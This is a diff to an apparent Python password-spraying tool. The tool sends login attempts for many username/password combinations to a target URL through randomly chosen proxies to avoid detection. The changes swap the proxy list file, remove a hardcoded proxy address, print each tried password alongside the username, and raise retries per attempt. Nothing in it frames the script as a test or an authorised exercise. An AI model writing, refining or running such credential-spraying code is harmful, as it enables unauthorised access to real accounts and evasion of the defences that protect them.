@@ -47,7 +47,7 @@ def read_proxies(file_path):
 
 base_dir = os.path.dirname(os.path.abspath(__file__))
 
-proxy_file_path = os.path.join(base_dir, 'data', 'Proxy', 'proxies.txt')
+proxy_file_path = os.path.join(base_dir, 'data', 'Proxy', 'proxies2.txt')
 proxies_list = read_proxies(proxy_file_path)
 
 
@@ -67,11 +67,6 @@ def attempt_login(username, password, max_retries=3):
         # Get a random proxy for each attempt
         proxy = get_random_proxy()
 
-        proxy = {
-            "http": "http://176.99.2.43:1081",
-            "https": "http://176.99.2.43:1081",
-        }
-        
         try:
             # Adding a timeout of 10 seconds for the request
             response = requests.post(url, json=data, proxies=proxy, timeout=10)
@@ -91,26 +86,26 @@ def attempt_login(username, password, max_retries=3):
                 return True
             elif response.status_code == 401:
                 with print_lock:
-                    print(f"[-] Failed login for {username} (Status Code: 401 Unauthorized) using proxy {proxy}")
+                    print(f"[-] Failed login for {username}:{password} (Status Code: 401 Unauthorized) using proxy {proxy}")
                 return False  # No retry, incorrect username/password
             elif response.status_code == 403:
                 with print_lock:
-                    print(f"[-] Failed login for {username} (Status Code: 403 Forbidden) using proxy {proxy}")
+                    print(f"[-] Failed login for {username}:{password} (Status Code: 403 Forbidden) using proxy {proxy}")
                 return False  # No retry, incorrect username/password
             else:
                 with print_lock:
-                    print(f"[-] Failed login for {username} (Status Code: {response.status_code}) using proxy {proxy}")
+                    print(f"[-] Failed login for {username}:{password} (Status Code: {response.status_code}) using proxy {proxy}")
                 return False  # No retry, username/password issue or other error
 
         except requests.exceptions.ProxyError:
             with print_lock:
-                print(f"[-] Proxy error occurred for {username} using proxy {proxy}, retrying...")
+                print(f"[-] Proxy error occurred for {username}:{password} using proxy {proxy}, retrying...")
         except requests.exceptions.Timeout:
             with print_lock:
-                print(f"[-] Timeout error for {username} using proxy {proxy}, retrying...")
+                print(f"[-] Timeout error for {username}:{password} using proxy {proxy}, retrying...")
         except requests.exceptions.RequestException as e:
             with print_lock:
-                print(f"[-] General error for {username} using proxy {proxy}: {e}, retrying...")
+                print(f"[-] General error for {username}:{password} using proxy {proxy}: {e}, retrying...")
 
         # Retry by increasing the retry count
         retries += 1
@@ -131,7 +126,7 @@ def password_spray(usernames, passwords):
     #             executor.submit(attempt_login, username, password)
     for username in usernames:
         for password in passwords:
-            attempt_login(username, password, 3)
+            attempt_login(username, password, 5)
 
 # Run the password spray
 if __name__ == "__main__":
